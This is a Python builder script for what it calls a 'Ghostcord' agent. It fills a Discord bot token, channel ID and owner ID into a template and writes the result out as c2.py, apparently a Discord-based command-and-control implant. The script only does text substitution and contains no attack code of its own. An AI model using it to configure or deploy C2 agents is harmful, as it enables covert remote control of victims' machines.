import os

TEMPLATE = 'agent_template.py'
OUTPUT = 'c2.py'

if not os.path.exists(TEMPLATE):
    print(f'[!] {TEMPLATE} not found. Please copy your current agent.py to agent_template.py and use {{BOT_TOKEN}}, {{CHANNEL_ID}}, {{OWNER_ID}} as placeholders.')
    exit(1)

print('=== Ghostcord Agent Builder ===')
bot_token = input('Enter your Discord BOT_TOKEN: ').strip()
channel_id = input('Enter your Discord CHANNEL_ID: ').strip()
owner_id = input('Enter your Discord OWNER_ID: ').strip()

with open(TEMPLATE, 'r', encoding='utf-8') as f:
    code = f.read()

code = code.replace('{BOT_TOKEN}', bot_token)
code = code.replace('{CHANNEL_ID}', channel_id)
code = code.replace('{OWNER_ID}', owner_id)

with open(OUTPUT, 'w', encoding='utf-8') as f:
    f.write(code)

print(f'[+] Built c2.py with your configuration!') 